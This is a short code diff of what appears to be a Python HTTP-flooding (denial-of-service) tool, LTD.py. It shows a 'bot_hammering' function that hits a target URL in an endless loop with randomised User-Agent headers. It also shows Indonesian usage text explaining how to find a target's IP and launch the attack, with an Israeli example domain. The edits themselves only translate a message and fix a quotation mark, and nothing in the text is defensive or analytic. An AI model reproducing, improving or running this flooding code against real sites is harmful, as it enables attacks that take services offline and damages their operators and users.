@@ -34,7 +34,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[91mbot Trojan...\033[0m")
+			print("\033[91mMempersiapkan Trojan...\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -117,7 +117,7 @@ def usage():
   \033[1;37m=================================\033[1;m
 
 
-  \x1b[1;37;43mNote : Cara Cek IP gunakan perintah ping "url\033[0m
+  \x1b[1;37;43mNote : Cara Cek IP gunakan perintah ping "url"\033[0m
   \x1b[1;37;43mContoh : ping www.target.co.il\033[0m
 
   \033[1;33m>>Cara Penggunaan : python3 LTD.py "-s" "-i" "-t"<<\033[0m			
